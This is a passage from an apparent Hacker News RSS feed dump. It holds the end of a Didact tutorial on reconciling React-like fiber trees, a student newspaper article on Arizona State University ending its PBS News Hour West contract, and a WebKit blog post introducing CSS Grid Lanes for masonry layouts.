</span><span>=</span><span> fiber</span><span>.</span><span>props</span><span>.</span><span>children</span></p></div><div><p><span>  </span><span>reconcileChildren</span><span>(</span><span>fiber</span><span>,</span><span> elements</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>fiber</span><span>.</span><span>child</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>return</span><span> fiber</span><span>.</span><span>child</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>  </span><span>let</span><span> nextFiber </span><span>=</span><span> fiber</span></p></div><div><p><span>  </span><span>while</span><span> </span><span>(</span><span>nextFiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>nextFiber</span><span>.</span><span>sibling</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>return</span><span> nextFiber</span><span>.</span><span>sibling</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>    nextFiber </span><span>=</span><span> nextFiber</span><span>.</span><span>parent</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>reconcileChildren</span><span>(</span><span>wipFiber</span><span>,</span><span> elements</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>let</span><span> index </span><span>=</span><span> </span><span>0</span></p></div><div><p><span>  </span><span>let</span><span> oldFiber </span><span>=</span></p></div><div><p><span>    wipFiber</span><span>.</span><span>alternate </span><span>&amp;&amp;</span><span> wipFiber</span><span>.</span><span>alternate</span><span>.</span><span>child</span></p></div><div><p><span>  </span><span>let</span><span> prevSibling </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>while</span><span> </span><span>(</span></p></div><div><p><span>    index </span><span>&lt;</span><span> elements</span><span>.</span><span>length </span><span>||</span></p></div><div><p><span>    oldFiber </span><span>!=</span><span> </span><span>null</span></p></div><div><p><span>  </span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>const</span><span> element </span><span>=</span><span> elements</span><span>[</span><span>index</span><span>]</span></p></div><div><p><span>    </span><span>let</span><span> newFiber </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>const</span><span> sameType </span><span>=</span></p></div><div><p><span>      oldFiber </span><span>&amp;&amp;</span></p></div><div><p><span>      element </span><span>&amp;&amp;</span></p></div><div><p><span>      element</span><span>.</span><span>type </span><span>==</span><span> oldFiber</span><span>.</span><span>type</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>sameType</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      newFiber </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>        </span><span>type</span><span>:</span><span> oldFiber</span><span>.</span><span>type</span><span>,</span></p></div><div><p><span>        </span><span>props</span><span>:</span><span> element</span><span>.</span><span>props</span><span>,</span></p></div><div><p><span>        </span><span>dom</span><span>:</span><span> oldFiber</span><span>.</span><span>dom</span><span>,</span></p></div><div><p><span>        </span><span>parent</span><span>:</span><span> wipFiber</span><span>,</span></p></div><div><p><span>        </span><span>alternate</span><span>:</span><span> oldFiber</span><span>,</span></p></div><div><p><span>        </span><span>effectTag</span><span>:</span><span> </span><span>"UPDATE"</span><span>,</span></p></div><div><p><span>      </span><span>}</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>element </span><span>&amp;&amp;</span><span> </span><span>!</span><span>sameType</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      newFiber </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>        </span><span>type</span><span>:</span><span> element</span><span>.</span><span>type</span><span>,</span></p></div><div><p><span>        </span><span>props</span><span>:</span><span> element</span><span>.</span><span>props</span><span>,</span></p></div><div><p><span>        </span><span>dom</span><span>:</span><span> </span><span>null</span><span>,</span></p></div><div><p><span>        </span><span>parent</span><span>:</span><span> wipFiber</span><span>,</span></p></div><div><p><span>        </span><span>alternate</span><span>:</span><span> </span><span>null</span><span>,</span></p></div><div><p><span>        </span><span>effectTag</span><span>:</span><span> </span><span>"PLACEMENT"</span><span>,</span></p></div><div><p><span>      </span><span>}</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>oldFiber </span><span>&amp;&amp;</span><span> </span><span>!</span><span>sameType</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      oldFiber</span><span>.</span><span>effectTag </span><span>=</span><span> </span><span>"DELETION"</span></p></div><div><p><span>      deletions</span><span>.</span><span>push</span><span>(</span><span>oldFiber</span><span>)</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>oldFiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      oldFiber </span><span>=</span><span> oldFiber</span><span>.</span><span>sibling</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>index </span><span>===</span><span> </span><span>0</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      wipFiber</span><span>.</span><span>child </span><span>=</span><span> newFiber</span></p></div><div><p><span>    </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>element</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      prevSibling</span><span>.</span><span>sibling </span><span>=</span><span> newFiber</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>    prevSibling </span><span>=</span><span> newFiber</span></p></div><div><p><span>    index</span><span>++</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>const</span><span> Didact </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>  createElement</span><span>,</span></p></div><div><p><span>  render</span><span>,</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>/** @jsx Didact.createElement */</span></p></div><div><p><span>function</span><span> </span><span>App</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>return</span><span> </span><span>&lt;</span><span>h1</span><span>&gt;</span><span>Hi </span><span>{</span><span>props</span><span>.</span><span>name</span><span>}</span><span>&lt;/</span><span>h1</span><span>&gt;</span></p></div><div><p><span>}</span></p></div><div><p><span>const</span><span> element </span><span>=</span><span> </span><span>&lt;</span><span>App</span><span> </span><span>name</span><span>=</span><span>"</span><span>foo</span><span>"</span><span> </span><span>/&gt;</span></p></div><div><p><span>const</span><span> container </span><span>=</span><span> document</span><span>.</span><span>getElementById</span><span>(</span><span>"root"</span><span>)</span></p></div><div><p><span>Didact</span><span>.</span><span>render</span><span>(</span><span>element</span><span>,</span><span> container</span><span>)</span></p></div></code></pre></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PBS News Hour West to go dark after ASU discontinues contract (146 pts)]]></title>
            <link>https://www.statepress.com/article/2025/12/politics-pbs-newshour-west-closure</link>
            <guid>46332400</guid>
            <pubDate>Fri, 19 Dec 2025 23:59:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.statepress.com/article/2025/12/politics-pbs-newshour-west-closure">https://www.statepress.com/article/2025/12/politics-pbs-newshour-west-closure</a>, See on <a href="https://news.ycombinator.com/item?id=46332400">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
                        <div>

                                                            <p>ASU's Walter Cronkite School of Journalism and Mass Communication will not renew its contract with <a href="https://www.pbs.org/newshour/about/newshour-west" target="_blank">PBS News Hour West</a>, ending a reporting hub that covered the western U.S. and updated the nightly news produced on the East Coast for West Coast viewers.&nbsp;</p>
<p>Located on the Downtown Phoenix campus, the bureau offered internship opportunities for journalism students at the University.</p>
<p>The bureau was created to help the national News Hour program, which is broadcast by <a href="https://weta.org/" target="_blank">WETA</a>, "work more closely with PBS stations and other media partners on the West Coast," according to an <a href="https://cronkite.asu.edu/news/2019/pbs-newshour-announces-launch-of-pbs-newshour-west-at-asus-cronkite-school" target="_blank">ASU News</a> article announcing the launch of the bureau in 2019. More than 20% of News Hour's audience resides in that region.</p>
<p>News Hour West will make its last contribution to the national broadcast on Dec. 19.</p>

                                

                                <p>Michael Rancilio, the general manager of News Hour Productions and WETA's executive vice president and chief content officer, said in an email to PBS News supporters that the decision was "based on Arizona State University's revised priorities," according to <a href="https://current.org/2025/11/weta-to-cut-staff-cancel-pbs-news-weekend-and-close-news-hour-west-bureau/" target="_blank">Current</a>.</p>
<p><strong>READ MORE: </strong><a href="https://www.statepress.com/article/2025/06/politics-public-media-arizona-pbs-executive-order" target="_blank">Federal funding cuts to public media may impact Arizona PBS, students</a></p>
<p>A spokesperson for the University declined to comment on the closing, referring The State Press to PBS.&nbsp;</p>
<p>Both PBS News and Arizona PBS responded to the news of the closure but did not provide any reasoning for the choice.</p>
<p>"We are grateful to our partners at ASU and the Cronkite School on our effort to launch PBS News Hour West back in 2019 and the important journalism our small but nimble team there has been able to produce," PBS News' executive director of communications, Nick Massella, said in a written statement.</p>
<p>Jeremy Cauthen, the senior director of brand engagement and marketing at Arizona PBS, said in a written statement that the ASU-News Hour West partnership benefited audiences in the western U.S. as well as University students.</p>
<p>"Even though the station will no longer be providing production support for 'PBS News Hour', we'll continue our nightly broadcast of PBS' flagship news program and our ongoing commitment to keeping Arizonans informed through local news and public affairs programs like 'Arizona Horizon' and 'Horizonte,'" Cauthen said in a written statement.</p>
<p>AJ Ceglia, a senior studying journalism and mass communication, is one of the broadcast production interns at News Hour West. The internship was one of her first professional experiences, she said.</p>
<p>"I was just so relieved to find out that they were so willing to take the time to teach everything that we needed to know to produce the news at night," Ceglia said. "It's very upsetting to hear that it was shut down."</p>
<p>Ceglia said she was told that ASU made the decision, not PBS. She was only told that the contract was not being renewed and did not know any of the logistics of the closure.</p>

                                
                                                                                                    <p>The agreement between News Hour West and the University was mutually beneficial, Ceglia said. PBS got a headquarters in the West at a school with reliable broadcasting equipment, and the University's contributions were rewarded with heightened visibility.</p>
<p>An aerial shot of the Cronkite building is shown at the end of the nightly News Hour broadcast, crediting the school for its support.</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/458RXqTPebc?si=LgSOEDxIkaL5tMPd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<p>Ceglia said News Hour West staff members will lose their jobs because of the closure.</p>
                                
                                <p>"It's just upsetting that they really enjoyed being able to support the students that did the program, and they really liked being able to share so much experience," Ceglia said.</p>
<p>Ceglia said she sympathizes with the interns who were set to work at News Hour West for the spring semester because "they're having it basically ripped out of their hands." To fulfill the internship requirement to graduate with a journalism and mass communication degree, they must now find another way to gain those credits.</p>
<p>"It's not anything my producers can control, but what (the producers are) doing is they are really trying to put those soon-to-be interns to another place to work," Ceglia said. "That is something they're very focused on right now."</p>
<p>Current interns are still able to get the internship credit, Ceglia said. Nonetheless, the closure has had a personal impact on her.</p>
<p>"I feel so strongly about it because it really was a great opportunity to learn and one of my first real professional ones," Ceglia said. "I'm sad to see it go."</p>
<p><em>Edited by Carsten Oyer, Henry Smardo, Sophia Braccio and Pippa Fung.</em></p>
<hr>
<p>Reach the reporter at elbradfo@asu.edu and follow <a href="https://twitter.com/emmalbradford__" rel="noopener noreferrer" target="_blank">@emmalbradford__</a> on X.</p>
                                <p>Like <a href="https://www.facebook.com/StatePress/" rel="noopener noreferrer" target="_blank">The State Press</a> on Facebook and follow <a href="https://twitter.com/statepress" rel="noopener noreferrer" target="_blank">@statepress</a> on X.</p>

                            
                            <div>
                                    
            <hr>
        <div><p><strong>Emma Bradford</strong><span>Lead Politics Reporter</span>
</p></div>
<div>
<p>Emma Bradford is a junior studying journalism and mass communication and political science with a minor in business. She has previously worked at the Cronkite News Washington, D.C. bureau as a Politics and Money Reporter. Bradford is in her fourth semester with The State Press and on the politics desk.&nbsp;</p>
<ul><li><a href="mailto:elbradfo@asu.edu">elbradfo@asu.edu</a></li></ul>
</div>
    
                            </div>

                            <hr>

                            <div><p>
                                Continue supporting student journalism and </p><a href="https://www.asufoundation.org/arts-and-community/the-state-press-CA124731.html" target="_blank"><u>donate</u></a><p> to The State Press today.
                            </p></div>

                            

                            <hr>
                            
                        </div>
                    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CSS Grid Lanes (651 pts)]]></title>
            <link>https://webkit.org/blog/17660/introducing-css-grid-lanes/</link>
            <guid>46331586</guid>
            <pubDate>Fri, 19 Dec 2025 22:13:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/">https://webkit.org/blog/17660/introducing-css-grid-lanes/</a>, See on <a href="https://news.ycombinator.com/item?id=46331586">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-17660">
            
            

            <div>
                                
                <p>It’s here, the future of masonry layouts on the web! After the groundwork laid by Mozilla, years of effort by Apple’s WebKit team, and many rounds debate at the CSS Working Group with all the browsers, it’s now clear how it works.</p>
<p>Introducing CSS Grid Lanes.</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>250px</span>, <span>1</span><span>fr</span>));
  <span>gap</span>: <span>16px</span>;
}
</code></pre>
<p>Try it today in Safari Technology Preview 234.</p>
<h2>How Grid Lanes work</h2>
<p>Let’s break down exactly how to create this classic layout.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-classic-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img fetchpriority="high" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light.png" alt="Classic masonry-style layout of photos of various aspect ratios, all the same width, aligned in six columns" width="2000" height="1311" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-300x197.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-1024x671.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-768x503.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-1536x1007.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px"></picture><figcaption>You can try out this <a href="https://webkit.org/demos/grid3/photos/">demo of photo gallery layouts</a> today in Safari Technology Preview.</figcaption></figure>
<p>First, the HTML.</p>
<pre><code><span>&lt;<span>main</span> <span>class</span>=<span>"container"</span>&gt;</span>
  <span>&lt;<span>figure</span>&gt;</span><span>&lt;<span>img</span> <span>src</span>=<span>"photo-1.jpg"</span>&gt;</span><span>&lt;/<span>figure</span>&gt;</span>
  <span>&lt;<span>figure</span>&gt;</span><span>&lt;<span>img</span> <span>src</span>=<span>"photo-2.jpg"</span>&gt;</span><span>&lt;/<span>figure</span>&gt;</span>
  <span>&lt;<span>figure</span>&gt;</span><span>&lt;<span>img</span> <span>src</span>=<span>"photo-3.jpg"</span>&gt;</span><span>&lt;/<span>figure</span>&gt;</span>
  <span>&lt;!-- etc --&gt;</span>
<span>&lt;/<span>main</span>&gt;</span>
</code></pre>
<p>Let’s start by applying <code>display: grid-lanes</code> to the <code>main</code> element to create a Grid container ready to make this kind of layout. Then we use <code>grid-template-columns</code> to create the “lanes” with the full power of CSS Grid.</p>
<p>In this case, we’ll use <code>repeat(auto-fill, minmax(250px, 1fr))</code> to create flexible columns at least 250 pixels wide. The browser will decide how many columns to make, filling all available space.</p>
<p>And then, <code>gap: 16px</code> gives us 16 pixel gaps between the lanes, and 16 pixel gaps between items within the lanes.</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>250px</span>, <span>1</span><span>fr</span>));
  <span>gap</span>: <span>16px</span>;
}
</code></pre>
<p>That’s it! In three lines of CSS, with zero media queries or container queries, we created a flexible layout that works on all screen sizes.</p>
<p>Think of it like a highway of cars in bumper-to-bumper traffic.</p>
<figure><img decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234.png" alt="Cartoon drawing of a highway from above. Nine cars fill four lanes of traffic, bumper to bumper. Each car has a number labeling it, showing the order these would be in HTML." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px"></figure>
<p>Just like the classic <a href="https://masonry.desandro.com/">Masonry library</a>, as the browser decides where to put each item, the next one is placed in whichever column gets it closest to the top of the window. Like traffic, each car “changes lanes” to end up in the lane that gets them “the furthest ahead”.</p>
<p>This layout makes it possible for users to tab across the lanes to all currently-visible content, (not down the first column below the fold to the very bottom, and then back to the top of the second column). It also makes it possible for you to build a site that keeps loading more content as the user scrolls, infinitely, without needing JavaScript to handle the layout.</p>
<h2>The power of Grid</h2>
<h3>Varying lane sizes</h3>
<p>Because Grid Lanes uses the full power of CSS Grid to define lanes using <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Properties/grid-template-columns"><code>grid-template-*</code></a>, it’s easy to create creative design variations.</p>
<p>For example, we can create a flexible layout with alternating narrow and wide columns — where both the first and last columns are always narrow, even as the number of columns changes with the viewport size. This is accomplished with <code>grid-template-columns: repeat(auto-fill, minmax(8rem, 1fr) minmax(16rem, 2fr)) minmax(8rem, 1fr)</code>.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light.png" alt="Demo layout of photos, where the 1st, 3rd, 5th, and 7th column are narrow, while the 2nd, 4th and 6th columns are twice as wide. " width="2000" height="1311" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-300x197.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-1024x671.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-768x503.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-1536x1007.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px"></picture><figcaption>Try out the <a href="https://webkit.org/demos/grid3/photos/">demo of photo gallery layouts</a> today in Safari Technology Preview.</figcaption></figure>
<p>There’s a whole world of possibilities using <code>grid-template-*</code> syntax.</p>
<h4>Spanning items</h4>
<p>Since we have the full power of Grid layout, we can also span lanes, of course.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light.png" alt="A complex layout of titles with teaser text for over two dozen articles — telling people what they'll experience if they open the article. The first teaser has a very large headline with text, and spans four columns. Five more teasers are medium-sized, bowl and next to the hero. The rest of the space available is filled in with small teasers. None of the teasers have the same amount of content as the rest. The heights of each box are random, and the layout tucks each box up against the one above it." width="2000" height="1394" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-300x209.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-1024x714.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-768x535.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-1536x1071.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px"></picture><figcaption>Try out the <a href="https://webkit.org/demos/grid3/newspaper/">demo of newspaper article layout</a> today in Safari Technology Preview.</figcaption></figure>
<pre><code><span>main</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>20</span><span>ch</span>, <span>1</span><span>fr</span>));
  <span>gap</span>: <span>2</span><span>lh</span>;
}
<span>article</span> { 
  <span>grid-column</span>: <span>span</span> <span>1</span>; 
}
<span>@media</span> (1250<span>px</span> &lt; <span>width</span>) {
  <span>article</span>:<span>nth-child</span>(<span>1</span>) { 
    <span>grid-column</span>: <span>span</span> <span>4</span>;             
  }
  <span>article</span><span>:nth-child</span>(2), <span>article</span><span>:nth-child</span>(3), <span>article</span><span>:nth-child</span>(4), <span>article</span><span>:nth-child</span>(5), <span>article</span><span>:nth-child</span>(6), <span>article</span><span>:nth-child</span>(7), <span>article</span><span>:nth-child</span>(8) { 
    <span>grid-column</span>: <span>span</span> <span>2</span>; 
  }
}
</code></pre>
<p>All the article teasers are first set to span 1 column. Then the 1st item is specifically told to span 4 columns, while the 2nd – 8th to span 2 columns. This creates a far more dynamic graphic design than the typical symmetrical, everything the same-width, everything the same-height layout that’s dominated over the last decade.</p>
<h3>Placing items</h3>
<p>We can also explicitly place items while using Grid Lanes. Here, the header is always placed in the last column, no matter how many columns exist.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-museum.png" alt="A layout of paintings —&nbsp;each has a bit of text below the painting: title, etc. The paintings are laid out in 8 columns. Over on the right, spanning across two columns is the header of the website. " width="2000" height="1279" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-museum.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-300x192.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-1024x655.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-768x491.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-museum-1536x982.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px"><figcaption>Try out the <a href="https://webkit.org/demos/grid3/museum/">demo of a museum website layout</a> today in Safari Technology Preview.</figcaption></figure>
<pre><code><span>main</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>24</span><span>ch</span>, <span>1</span><span>fr</span>));
}
<span>header</span> {
  <span>grid-column</span>: <span>-3</span> / <span>-1</span>;
}
</code></pre>
<h2>Changing directions</h2>
<p>Yes, lanes can go either direction! All of the examples above happen to create a “waterfall” shape, where the content is laid out in columns. But Grid Lanes can be used to create a layout in the other direction, in a “brick” layout shape.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout.png" alt="Contrasting cartoon drawings: on the left, waterfall layout with boxes lined up in columns, falling down the page. And &quot;brick&quot; layout, with boxes flowing left to right, stacked like bricks in rows." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-waterfall-v-brick-layout-1536x864.png 1536w" sizes="auto, (max-width: 1920px) 100vw, 1920px"></figure>
<p>The browser automatically creates a waterfall layout when you define columns with <code>grid-template-columns</code>, like this:</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>1</span><span>fr</span> <span>1</span><span>fr</span> <span>1</span><span>fr</span> <span>1</span><span>fr</span>;
}
</code></pre>
<p>If you want a brick layout in the other direction, instead define the rows with <code>grid-template-rows</code>:</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-rows</span>: <span>1</span><span>fr</span> <span>1</span><span>fr</span> <span>1</span><span>fr</span>;
}
</code></pre>
<p>This works automatically thanks to a new default for<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Properties/grid-auto-flow"><code>grid-auto-flow</code></a>, the <code>normal</code> value.  It figures out whether to create columns or rows based on whether you defined the lanes using <code>grid-template-columns</code> or <code>grid-template-rows</code>.</p>
<p>The CSS Working Group is still discussing which property will explicitly control the flow orientation, and what its syntax will be. The debate is over whether to reuse <code>grid-auto-flow</code> or create new properties like <code>grid-lanes-direction</code>. If you’re interested in reading about the options being considered or chime in with your thoughts, see <a href="https://github.com/w3c/csswg-drafts/issues/12803#issuecomment-3643945412">this discussion</a>.</p>
<p>However, since <code>normal</code> will be the initial value either way, you don’t have to wait for this decision to learn Grid Lanes. When you define only one direction — <code>grid-template-rows</code> <em>or</em> <code>grid-template-columns</code> — it will Just Work™. (If it doesn’t, check if <code>grid-auto-flow</code> is set to a conflicting value. You can<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Values/unset"><code>unset</code></a> it if needed.)</p>
<h2>Placement sensitivity</h2>
<p>“Tolerance” is a new concept created for Grid Lanes. It lets you adjust just how picky the layout algorithm is when deciding where to place items.</p>
<p>Look at the next drawing. Notice that Car 4 is a tiny bit shorter than Car 1. When the “tolerance” is zero, Car 6 ends up in the right-most lane, while Car 7 is on the left. Car 6 ends up behind Car 4 on the right because that gets it a tiny bit closer “down the road” (closer to the top of the Grid container). Car 7 then takes the next-closest-to-the-top slot, and ends up behind Car 1 on the left. The end result? The first horizontal grouping of content is ordered 1, 2, 3, 4, and the next is 7, 5, 6.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1.png" alt="Same cartoon drawing of the highway of bumper to bumper traffic from above." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-1-1536x864.png 1536w" sizes="auto, (max-width: 1920px) 100vw, 1920px"></figure>
<p>But the difference in length between Car 1 and Car 4 is tiny. Car 6 isn’t meaningfully closer to the top of the page. And having item 6 on the right, with item 7 on the left is likely an unexpected experience — especially for users who are tabbing through content, or when the content order is somehow labeled.</p>
<p>These tiny differences in size don’t matter in any practical sense. Instead, the browser should consider item sizes like Car 1 and Car 4 to be a tie. That’s why the default for <code>item-tolerance</code> is <code>1em</code> — which means only differences in content length greater than 1 em will matter when figuring out where the next item goes.</p>
<p>If you’d like the layout of items to shuffle around less, you can set a higher value for <code>item-tolerance</code>. In the next digram, the tolerance is set to half-a-car, causing the cars to lay out basically from left to right and only moving to another lane to avoid the extra-long limo. Now, the horizontal groupings of content are 1, 2, 3, 4, and 5, 6, 7.</p>
<figure><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2.png" alt="Now the highway has the cars ordered in a fashion that's less chaotic." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-tolerance-2-1536x864.png 1536w" sizes="auto, (max-width: 1920px) 100vw, 1920px"></figure>
<p>Think of tolerance as how chill you want the car drivers to be. Will they change lanes to get just a few inches ahead? Or will they only move if there’s a lot of space in the other lane? The amount of space you want them to care about is the amount you set in <code>item-tolerance</code>.</p>
<p>Remember that people tabbing through the page will see each item highlighted as it comes into focus, and may be experiencing the page through a screenreader. An item tolerance that’s set too high can create an awkward experience jumping up and down the layout. An item tolerance that’s too low can result in jumping back and forth across the layout more than necessary. Adjust <code>item-tolerance</code> to something appropriate for the sizes and size variations of your content.</p>
<p>Currently, this property is named <code>item-tolerance</code> in the <a href="https://www.w3.org/TR/css-grid-3/#placement-tolerance">specification</a> and in Safari Technology Preview 234. However, there is still a chance this name will change, perhaps to something like <code>flow-tolerance</code> or <code>pack-tolerance</code>. If you have a preference, or ideas for a better name, you can <a href="https://github.com/w3c/csswg-drafts/issues/10884#issuecomment-3658059682">chime in here</a>. Keep an eye out for updates about the final name before using this property on production websites.</p>
<h2>Try it out</h2>
<p>Try out Grid Lanes in Safari Technology Preview 234! All of the demos at  <a href="https://webkit.org/demos/grid3/">webkit.org/demos/grid3</a> have been updated with the new syntax, including other use cases for Grid Lanes. It’s not just for images! For example, a mega menu footer full of links suddenly becomes easy to layout.</p>
